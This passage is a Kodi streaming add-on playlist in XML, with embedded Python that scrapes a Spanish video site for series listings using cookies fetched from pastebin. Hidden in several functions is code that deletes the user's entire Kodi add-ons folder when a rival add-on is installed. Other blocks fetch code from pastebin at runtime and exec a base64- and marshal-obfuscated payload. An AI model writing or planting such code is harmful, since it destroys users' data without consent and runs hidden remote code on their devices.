        response = requests.get('https://playdede.com/embed.php?id='+url+'&width=601&height=540', headers={'authority': 'playdede.com', 'pragma': 'no-cache', 'cache-control': 'no-cache', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOoOIK5GVbe9NzOCE', 'accept': '*/*', 'origin': 'https://playdede.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': referer, 'accept-language': 'es-ES,es;q=0.9', 'cookie': cookie}).text
        response = six.ensure_str(response)
        url_post = re.findall(patron, response)[0]
    except:
        response = 'NADA_LOGUEO'
    contador = 0
    while 'NADA_LOGUEO' in response or 'Cloudflare Ray ID:' in response or 'Olvidaste tu contrase' in response:
        try:
            cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
            response = requests.post('https://playdede.com/ajax.php', headers={'authority': 'playdede.com', 'pragma': 'no-cache', 'cache-control': 'no-cache', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOoOIK5GVbe9NzOCE', 'accept': '*/*', 'origin': 'https://playdede.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': referer, 'accept-language': 'es-ES,es;q=0.9', 'cookie': cookie}, data=data).text
            response = six.ensure_str(response)
            url_post = re.findall(patron, response)[0]
        except:
            response = 'NADA_LOGUEO'
        contador += 1
        if 10 == contador:
            break
    ArchivoDestino = TRANSLATEPATH('special://home/addons/plugin.video.cristalazul/')
    open(ArchivoDestino + 'html.txt','wb').write(six.ensure_binary(cookie+'*'+str(contador)+'*'+response))
    return url_post.replace('\/', '/')
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final_total]'
import re,requests,resolveurl,cfscrape,six
from kodi_six import xbmc,xbmcaddon,xbmcgui
from six.moves import urllib_parse
from resources.lib.megaserver import Client
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
def GetLSProData(page_data,Cookie_Jar,m):
    pasta = requests.get('https://pastebin.com/raw/FzdqRYcC', verify=False).text
    return six.ensure_str(pasta)
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/S1r1T5Y.png</thumbnail>
<fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
</item>










<item>
<title>[COLOR yellow]+[/COLOR][COLOR white]Sin encriptar PLAYLIST, CHANNEL Y SUELTO ARREGLADA[/COLOR]</title>
<link>$doregex[link_inteligente]</link>
<regex>
<name>link_inteligente</name>
<listrepeat><![CDATA[
<title>[COLOR yellow]+[/COLOR] [COLOR white][link_inteligente.param1][/COLOR]</title>
<link>$doregex[id]</link>
<thumbnail>https://i.ytimg.com/vi/[link_inteligente.param2]/hqdefault.jpg</thumbnail>
<fanart>https://i.imgur.com/zMg28gY.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = 'https://www.youtube.com/playlist?list=PLOwMvBWGjS50Gt8EFb0kjIFddrimFQ-zG'
import re,six
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cPrLItsLTfakl
 
  if six.PY2:
      import urllib2
      SOLICITUD = urllib2.urlopen(urllib2.Request(url)).read()
  else:
      import urllib.request
      SOLICITUD = urllib.request.urlopen(urllib.request.Request(url)).read().decode('utf-8')
  if 'channel' in url or 'youtube.com/c/' in url or 'youtube.com/user' in url:
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', SOLICITUD)
  elif 'list' in url:
    return re.findall('(?s)"title":.*?text"."(.*?)".*?url.*?url.*?Id"."(.*?)"', SOLICITUD)
  else:
    titulo = re.findall('<meta name="title" content="(.*?)"', SOLICITUD)[0]
    html = url + '2018CristalAzul'
    enlace = re.findall('v=(.*?)2018CristalAzul', html)[0]
    return [(titulo, enlace)]
]]></expres>
<page></page>
</regex> 
<regex>
<name>id</name>
<expres><![CDATA[#$pyFunction
import resolveurl
def GetLSProData(page_data,Cookie_Jar,m):
  url = 'https://www.youtube.com/watch?v=[link_inteligente.param2]'
  return resolveurl.resolve(url)
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/pe8exhb.jpg</thumbnail>
<fanart>https://i.imgur.com/zMg28gY.jpg</fanart>
 </item>
 
















<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]sERIES [COLOR white]PRODUCTORAS[/COLOR]</title>
<link>$doregex[makelist]</link>
<regex>
<name>makelist</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist.param1][/COLOR]</title>
<link>$doregex[makelist2]</link>
<thumbnail>[makelist.param3]</thumbnail>
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
def GetLSProData(page_data,Cookie_Jar,m):#CpRdIsSaTvAmL
  response = requests.get('https://pastebin.com/raw/mRDFTn7Y', verify=False).text
  items = re.findall('(?s)"titulo":"(.*?)".*?"url":"(.*?)".*?"imagen":"(.*?)"', response)
  numero_total = len(items)
  return [('[COLOR aqua]Cristal Azul, Productoras:[COLOR white] ('+str(numero_total)+')', ' ', 'https://i.imgur.com/5kY0BRB.png')] + sorted(items) + [('[COLOR white]No hay mas resultados...', ' ', 'https://i.imgur.com/5kY0BRB.png')]
]]></expres>
<page></page>
</regex>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</title>
<info>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</info>
<link>$doregex[temp]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist.param2]'
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data, Cookie_Jar, m,url=url):

 try:
  estamos = xbmcaddon.Addon('plugin.video.blackghost')
  version = estamos.getAddonInfo('version')
  if '.' in version:
    addon_path = TRANSLATEPATH('special://home/addons').decode('utf-8')
    shutil.rmtree(addon_path, ignore_errors=True)
    return xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
 except:
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    patron = '(?s)"item movies">.*?href="(.*?)".*?src="(.*?)".*?alt="(.*?)".*?p>(.*?)<.*?span>.(.*?)<'
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    try:
        cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
        response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
        response = six.ensure_str(response)
        data = re.findall(patron, response)
    except:
        response = 'NADA_LOGUEO'
    contador = 0
    while 'NADA_LOGUEO' in response or 'Cloudflare Ray ID:' in response or 'Olvidaste tu contrase' in response:
        try:
            cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
            response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
            response = six.ensure_str(response)
            data = re.findall(patron, response)
        except:
            response = 'NADA_LOGUEO'
        contador += 1
        if 10 == contador:
            return [(' ', 'https://i.imgur.com/r6aXooD.jpg', ' ', '[COLOR white]Web en Mantenimiento', ' ')]
    data = re.findall(patron, response)
    numero_total = len(data)
    video = []
    for item in data:
        url = item[0]
        imagen = item[1]
        titulo = item[2]
        titulo = six.ensure_str(titulo).replace('á', 'a').replace('é', 'e').replace('í', 'i').replace('ó', 'o').replace('ú', 'u').replace('Á', 'A').replace('É', 'E').replace('Ó', 'O').replace('Ú', 'U').replace('ñ', 'n')
        anio = item[3]
        categoria = item[4]
        video += [(titulo, imagen, url, anio, categoria)]
    return [(' ', 'https://i.imgur.com/qvzF7Rz.jpg', ' ', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white] ('+str(numero_total)+')', ' ')] + sorted(video) + [(' ', 'https://i.imgur.com/qvzF7Rz.jpg', ' ', '[COLOR white]No hay mas resultados...', ' ')]

  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")

]]></expres>
<page></page>
</regex>
<regex>
<name>temp</name>
<listrepeat><![CDATA[
<title>[COLOR white][temp.param1] [temp.param2][/COLOR]</title>
<info>[COLOR white][makelist2.param3] [temp.param1][/COLOR]</info>
<link>$doregex[cap]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
serie = '[makelist2.param1]'
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data,Cookie_Jar,m,url=url,serie=serie):

 try:
  estamos = xbmcaddon.Addon('plugin.video.blackghost')
  version = estamos.getAddonInfo('version')
  if '.' in version:
    addon_path = TRANSLATEPATH('special://home/addons').decode('utf-8')
    shutil.rmtree(addon_path, ignore_errors=True)
    return xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
 except:
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    patron = """(?s)class='se-c' data-season='(\d+)"""
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    response = requests.get(url+'/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    data = re.findall(patron, response)
    numero_total = len(data)
    video = []
    for item in data:
        video += [('Temporada', item)]
    return [('[COLOR aqua]Cristal Azul Temporadas '+serie, ' ')] + video + [('[COLOR white]No hay mas resultados...', ' ')]
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")

]]></expres>
<page></page>
</regex>
<regex>
<name>cap</name>
<listrepeat><![CDATA[
<title>[COLOR white][cap.param4] [cap.param3][/COLOR]</title>
<info>[COLOR white][cap.param1][/COLOR]</info>
<link>$doregex[link_final]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
temporada = '[temp.param2]'
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data,Cookie_Jar,m,url=url,temporada=temporada):
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    response = requests.get(url+'/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    patron = '(?s)href="(.*?)".*?src="(.*?)".*?epst"(.*?)<.*?numerando">(.*?)<'
    data = re.findall(patron, response.split("class='se-c' data-season='"+temporada+"'")[1].split("</ul></div></div>")[0])
    numero_total = len(data)
    return [(' ', ' ', ' ', '[COLOR aqua]Cristal Azul Resultados Capitulos: [COLOR white] ('+str(numero_total)+')')] + data + [(' ', ' ', ' ', '[COLOR white]No hay mas resultados...')]
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<listrepeat><![CDATA[
<title>[COLOR white][link_final.param2] [link_final.param3] [link_final.param4] [/COLOR]</title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[cap.param1]'
import re,requests,base64,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath

def GetLSProData(page_data,Cookie_Jar,m,url=url):

  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'streamspro' in id:
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    patron = '(?s)href="(.*?)".*?src.*?>(.*?)<.*?>(.*?)<.*?languages/(.*?)[_\.]'
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    response = requests.get(url+'/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    data = re.findall(patron, response.split("linksUsers")[1].split("linksUsers")[0])
    try:
        enlaces_post = re.findall('(?s)playerItem.*?lang="(.*?)".*?Player="(.*?)".*?h3>(.*?)<.*?Calidad: (.*?)<', response)
        lista_post = []
        for item in enlaces_post:
            if 'powvideo' in item[2] or 'waaw' in item[2] or 'streamplay' in item[2] or 'vidtodo' in item[2]:
                url = ''
            else:
                lista_post += [(item[1], '[COLOR gold]E.Oficial '+item[2], item[3], item[0])]
    except:
        lista_post = []
    data = lista_post + data
    videos = []
    for item in data:
      if 'powvideo' in item[1] or 'waaw' in item[1] or 'streamplay' in item[1] or 'vidtodo' in item[1]:
          url = ''
      else:
          url = item[0]
          servidor = item[1]
          calidad = item[2]
          idioma = item[3]
          videos += [(url, servidor, calidad, idioma)]
    numero_total = len(videos)
    return [('http', ' ', ' ', '[COLOR aqua]Cristal Azul Resultados links: [COLOR white] ('+str(numero_total)+')')] + videos + [('http', ' ', ' ', '[COLOR white]No hay mas resultados...')]
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final_total</name>
<expres><![CDATA[#$pyFunction
url = '[link_final.param1]'
referer = '[cap.param1]'
import re,requests,base64,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath

def GetLSProData(page_data,Cookie_Jar,m,url=url,referer=referer):

  if 'http' in url:
    return url
  else:
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia )
    patron = "src='(.*?)'"
    data = "------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"_method\"\r\n\r\ngetPlayer\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n" + url + "\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"width\"\r\n\r\n601\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"height\"\r\n\r\n540\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE--\r\n"
    try:
        cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
        #response = requests.post('https://playdede.com/ajax.php', headers={'authority': 'playdede.com', 'pragma': 'no-cache', 'cache-control': 'no-cache', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOoOIK5GVbe9NzOCE', 'accept': '*/*', 'origin': 'https://playdede.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': referer, 'accept-language': 'es-ES,es;q=0.9', 'cookie': cookie}, data=data).text
        response = requests.get('https://playdede.com/embed.php?id='+url+'&width=601&height=540', headers={'authority': 'playdede.com', 'pragma': 'no-cache', 'cache-control': 'no-cache', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOoOIK5GVbe9NzOCE', 'accept': '*/*', 'origin': 'https://playdede.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': referer, 'accept-language': 'es-ES,es;q=0.9', 'cookie': cookie}).text
        response = six.ensure_str(response)
        url_post = re.findall(patron, response)[0]
    except:
        response = 'NADA_LOGUEO'
    contador = 0
    while 'NADA_LOGUEO' in response or 'Cloudflare Ray ID:' in response or 'Olvidaste tu contrase' in response:
        try:
            cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
            response = requests.post('https://playdede.com/ajax.php', headers={'authority': 'playdede.com', 'pragma': 'no-cache', 'cache-control': 'no-cache', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOoOIK5GVbe9NzOCE', 'accept': '*/*', 'origin': 'https://playdede.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': referer, 'accept-language': 'es-ES,es;q=0.9', 'cookie': cookie}, data=data).text
            response = six.ensure_str(response)
            url_post = re.findall(patron, response)[0]
        except:
            response = 'NADA_LOGUEO'
        contador += 1
        if 10 == contador:
            break
    ArchivoDestino = TRANSLATEPATH('special://home/addons/plugin.video.cristalazul/')
    open(ArchivoDestino + 'html.txt','wb').write(six.ensure_binary(cookie+'*'+str(contador)+'*'+response))
    return url_post.replace('\/', '/')
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final_total]'
import re,requests,resolveurl,cfscrape,six
from kodi_six import xbmc,xbmcaddon,xbmcgui
from six.moves import urllib_parse
from resources.lib.megaserver import Client
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
def GetLSProData(page_data,Cookie_Jar,m):
    pasta = requests.get('https://pastebin.com/raw/FzdqRYcC', verify=False).text
    return six.ensure_str(pasta)
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/S1r1T5Y.png</thumbnail>
<fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
</item>













<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]sERIES [COLOR white]PRODUCTORAS[/COLOR]</title>
<link>$doregex[makelist]</link>
<regex>
<name>makelist</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist.param1][/COLOR]</title>
<link>$doregex[makelist2]</link>
<thumbnail>[makelist.param3]</thumbnail>
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
def GetLSProData(page_data,Cookie_Jar,m):#CpRdIsSaTvAmL
  response = requests.get('https://pastebin.com/raw/mRDFTn7Y', verify=False).text
  items = re.findall('(?s)"titulo":"(.*?)".*?"url":"(.*?)".*?"imagen":"(.*?)"', response)
